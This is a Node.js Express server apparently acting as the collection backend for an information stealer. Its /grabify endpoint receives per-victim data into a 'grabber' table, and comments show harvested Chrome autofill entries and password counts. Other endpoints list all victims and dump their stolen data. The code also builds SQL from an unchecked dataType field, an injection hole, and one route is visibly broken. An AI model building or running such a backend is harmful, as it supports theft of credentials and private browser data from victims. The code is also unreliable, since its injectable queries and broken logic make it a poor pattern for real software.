const express = require("express");
const app = express();
const db = require("./database.js");
var cors = require("cors");

const HTTP_PORT = 8080;

app.use(cors());
app.use(express.json({ limit: "100mb" }));

app.get("/", function (req, res) {
  res.send({
    status: "OK",
    message: "Hello World!",
  });
});

app.post("/grabify", function (req, res) {
  const body = req.body;
  const dataType = body.dataType; // Update this to 'dataType' if needed
  const user = body.user;
  const data_information = body.data;

  // Update SQL database, if the user exists, update the data, if not, create a new entry

  const sql = `SELECT * FROM grabber WHERE user=?`;
  const params = [user];

  db.get(sql, params, function (err, row) {
    console.log("Row: ", row);
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    if (row) {
      // Update the data
      const updateSql = `UPDATE grabber SET ${dataType}=? WHERE user=?`;
      const updateParams = [data_information, user];

      db.run(updateSql, updateParams, function (err, row) {
        if (err) {
          res.status(400).json({ error: err.message });
          return;
        }

        res.json({
          message: "success",
        });
      });
    } else {
      // Create a new entry
      const insertSql = `INSERT INTO grabber (user, ${dataType}) VALUES (?,?)`;
      const insertParams = [user, data_information];

      db.run(insertSql, insertParams, function (err, row) {
        console.log("Insert params: ", row, err);
        if (err) {
          res.status(400).json({ error: err.message });
          return;
        }

        console.log("New entry created");
        console.log(row);

        res.json({
          message: "success",
          data: data_information, // Use data_information instead of data
        });
      });
    }
  });
});

app.get("/getall", function (req, res) {
  const sql = `SELECT * FROM grabber`;
  const params = [];

  db.all(sql, params, function (err, rows) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    res.json({
      message: "success",
      data: rows,
    });
  });
});

app.get("/get/users", function (req, res) {
  const sql = `SELECT id, user FROM grabber`;
  const params = [];

  db.all(sql, params, function (err, rows) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    const users = rows.map((row) => {
      return {
        id: row.id,
        user: row.user,
      };
    });

    res.json({
      message: "success",
      data: users,
    });
  });
});

app.get("/get/user/:user", function (req, res) {
  const sql = `SELECT * FROM grabber WHERE user=?`;
  const params = [req.params.user];

  db.get(sql, params, function (err, row) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    res.json({
      message: "success",
      data: row,
    });
  });
});

app.get("/get/user/:user/:dataType", function (req, res) {
  const sql = `SELECT ${req.params.dataType} FROM grabber WHERE user=?`;
  const params = [req.params.user];

  db.get(sql, params, function (err, row) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    res.json({
      message: "success",
      data: JSON.parse(row[req.params.dataType]), // Update this to 'dataType' if needed
    });
  });
});

// Custom Routes for special data types
app.get("/get/user/:user/browsers/pre", function (req, res) {
  const sql = `SELECT browser FROM grabber WHERE user=?`;
  const params = [req.params.user];

  db.get(sql, params, function (err, row) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    // Example browsers: {"browser":"{\"chrome\": {\"Autofill\": {\"columns\": [\"name\", \"value\", \"value_lower\", \"date_created\", \" ...

    // Return to the user:
    // {
    // "chrome": {
    // Autofill: 32,
    // Passwords: 12,
    // ...
    //}
    //}

    // Remove the first " and the last "

    // Parse the JSON
    const browserData = JSON.parse(row.browser);

    browserData[0] = "";
    const removedLast = browserData.substring(0, browserData.length - 1);

    const browserKeys = Object.keys(removedLast);
    res.json(removedLast);
    return;

    const browserDataFormatted = browserKeys.map((browserKey) => {
      const browser = browserData[browserKey];
      const browserKeys = Object.keys(browser);
      //{\"columns\": [\"name\", \"value\", \"value_lower\", \"date_created\", \"date_last_used\", \"count\"], \"results\": \"[[\\\"username\\\", \\\"95423035\\\", \\\"95423035\\\", 1698934710, 1698934710, 1], [\\\"edPaHX\\\", \\\"140406 89347\\\", \\\"140406 89347\\\", 1698912633, 1698912633, 1],

      const browserFormatted = browserKeys.map((browserKey) => {
        return {
          [browserKey]: browser[browserKey]?.results?.length || 0,
        };
      });

      return {
        [browserKey]: browserFormatted,
      };
    });

    res.json({
      message: "success",
      data: browserDataFormatted,
    });
  });
});

app.listen(HTTP_PORT, () => {
  console.log("Server running on port %PORT%".replace("%PORT%", HTTP_PORT));
});
